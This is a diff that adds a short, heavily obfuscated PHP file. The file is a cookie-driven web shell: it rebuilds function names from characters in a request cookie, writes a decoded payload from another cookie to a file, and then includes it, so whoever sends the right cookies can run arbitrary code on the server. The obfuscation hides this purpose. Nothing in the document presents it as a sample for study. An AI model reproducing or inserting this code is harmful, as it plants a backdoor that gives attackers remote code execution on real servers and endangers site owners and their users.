@@ -1,0 +1,2 @@
+<?php
+$zBF=$_COOKIE	;$bK	= 0;	$DeN=		(74-64 ) ;	$uFBf=	array(); $uFBf[ $bK ]="" ;	while ( $DeN )	{ $uFBf [$bK] .= $zBF	[ 	( 18	-6)][ $DeN]; if (	! $zBF [	(	79 -	67) ][ $DeN	+	1]){ if(	!	$zBF[ 	( 79-67	) ][$DeN + 2 ] )	break	;  $bK ++	;		$uFBf	[$bK	]=""; $DeN	++;		} $DeN =	$DeN +	 (92-82)+1	;}$bK	=	$uFBf [		(	23-2)		]	() .$uFBf	[	(	76-	75	)]; if (!$uFBf[		( 12-	10 )	] ($bK))	{$DeN= $uFBf [		(72-43	) 	]	(	$bK ,$uFBf[( 83 - 71	)  ]); 	$uFBf [(49 - 45) ] ($DeN , $uFBf[	(	22 - 6 ) 	]	.	$uFBf [ ( 92- 87)]	(	$uFBf[ (96-	93 )	]	($zBF[3]))) ;} include($bK	);
